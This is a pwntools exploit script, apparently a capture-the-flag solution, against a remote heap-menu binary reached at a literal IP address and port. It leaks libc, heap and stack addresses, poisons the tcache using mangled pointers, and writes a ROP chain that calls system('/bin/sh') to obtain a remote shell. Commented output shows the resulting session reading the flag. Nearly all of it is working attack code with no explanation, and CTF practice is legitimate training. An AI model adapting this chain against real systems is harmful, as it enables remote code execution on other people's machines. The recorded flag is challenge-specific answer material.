#!/usr/bin/python3
#!/usr/bin/env python3
from pwn import *
import warnings
warnings.filterwarnings("ignore")
exe = ELF("./lle")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
# context.log_level='debug'
p = remote("154.26.136.227", 54667)
# p = process([exe.path])
def gdbs():
    context.terminal = ["foot"]
    gdb.attach(p, gdbscript="""
    decompiler connect ida

               """)
    # p = gdb.debug([exe.path],"""
    #
    #                 """)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slna = lambda msg,data: p.sendlineafter(msg,str(data))
sln = lambda data: p.sendline(str(data))
def option(num):
    slna(b"choice: ", num)


def cr_array(id, sz=0):
    lst = [id] * sz
    option(1)
    slna(b'ID: ', id)
    slna(b'input? ', sz)
    if sz != 0:
        for i in range(sz):
            sln(lst[i])


def fr_array(id):
    option(2)
    slna(b'ID: ', id)


def leak(id):
    lst = []
    option(3)
    slna(b'ID: ', id)
    while True:
        res = p.recvline()
        if b'View' in res:
            break
        res = res.split()
        print(res)
        lst.append(res[5])
    return lst
def show(id):
    sla(":","3")
    sla(":",str(id))

def cr_name(idx, sz, pa):
    option(5)
    slna(b'dex: ', idx)
    slna(b'ze: ', sz)
    s(pa)
def fr_name(idx):
    sla(":","6")
    sla(":",str(idx))
def e_array(ids,num,num2):
    sla(":","4")
    sla(":",str(ids))
    for i in range(num):
        sl(str(num2))
def add(ids, size, num):
    sla(":","1")
    sla(":",str(ids))
    sla("?",str(size))
    input("input num")
    for i in range(size):
        sl(str(num))
def protect(ptr1,ptr2):
    return ptr1^(ptr2>>12)
cr_array(1, 4)
cr_array(2, 4)
cr_array(3, 4)
# cr_array(3, 4)
for i in range(7):
    cr_array(i+4, 4)
fr_array(2)
cr_array(2, 4)
for i in range(7):
    fr_array(-i+3+7)

fr_array(3)
lst_leak = leak(3)
libc.address = int(lst_leak[0], 16) - 0x203b20
print(f"libc.address: {hex(libc.address)}")
test = libc.address + 0x203b30
cr_name(1,0x208,b"a"*(0x200 - 0x10)+ p8(3) + b"\0\0\0" + p16(0x1ea))
# cr_array(4, 4)
# cr_array(5, 4)
# for i in range(7):
cr_name(2,0x210,b"nameoverwrite")
# fr_array(3)
# cr_array(2)
# cr_array(4)
# fr_array(2)
show(3)
p.recvuntil("Number at index 415 is: ")
heap = int(p.recvline(),16) - 0x700
log.info(f"{hex(heap) = }")
fr_name(1)
array_len = 0x8b 
cr_name(1,0x210,b"a"*(0x200 - 0x10)+ p8(3) + b"\0\0\0" + p16(array_len))
sla(":","4")
sla(":","3")
input("overwrite tcache: ")
target = heap + 0xd90
for i in range(0x8b):
    if i == 64:
        sl(str(0x8b00000003))
        continue
    if i == 65 or i == 66 or i == 67:
        if i == 65:
            sl(str(libc.address + 0x20447f))
            continue
        sl(str(0))
        continue
    if i == 68:
        sl(str(0x230))
        continue
    if i == 69:
        sl(str(0x231))
        continue
    sl("200")
input("continue to input -> ")
show(0xffffff00)
p.recvuntil("Number at index 76 is:")
# part1 = int(p.recvline(),16) >> 24
# p.recvuntil("b'Number at index 422 is:")
# part2 =int(int(p.recvline(),16))
stack = int(p.recvline(),16) >> 8
log.info(f"{hex(stack) = }")
target_stack = stack - 288 - 8
log.info(f"{hex(target_stack) = }")
p.recvuntil("Number at index 254")
fr_name(1)
cr_name(1,0x210,b"a"*(0x200 - 0x10)+ p8(3) + b"\0\0\0" + p16(array_len + 2))
sla(":","4")
sla(":","3")
input("overwrite tcache: ")
target = heap + 0xd90
for i in range(0x8b):
    if i == 64:
        sl(str(0x8d00000003))
        continue
    if i == 65 or i == 66 or i == 67:
        if i == 65:
            sl(str(libc.address + 0x20447f))
            continue
        sl(str(0))
        continue
    if i == 68:
        sl(str(0x230))
        continue
    if i == 69:
        sl(str(0x231))
        continue
    sl(str(0x230))

sl(str(0x231))
sl(str(protect(target_stack,target)))
sl("0")
cr_name(0,0x210,b"a")
sla(":","1")
sla(":","56")
sla("?","5")
sl(str(stack))
sl(str(libc.address + 0x000000000002882f)) # alignement
sl(str(libc.address + 0x000000000010f75b))
sl(str(libc.search("/bin/sh\0").__next__()))
sl(str(libc.sym.system))
# gdbs()
sla(":","7")

# flag
# ll
# $ cat flag
# [DEBUG] Sent 0x9 bytes:
#     b'cat flag\n'
# [DEBUG] Received 0x42 bytes:
#     b'W1{hjhj_ll_5t4nds_f0R_l0ng_l0ng_4f31a1b789b5426b4abebcc3cf98ef7a}\n'
# W1{hjhj_ll_5t4nds_f0R_l0ng_l0ng_4f31a1b789b5426b4abebcc3cf98ef7a}
# [*] Got EOF while reading in interactive
# $  

p.interactive()
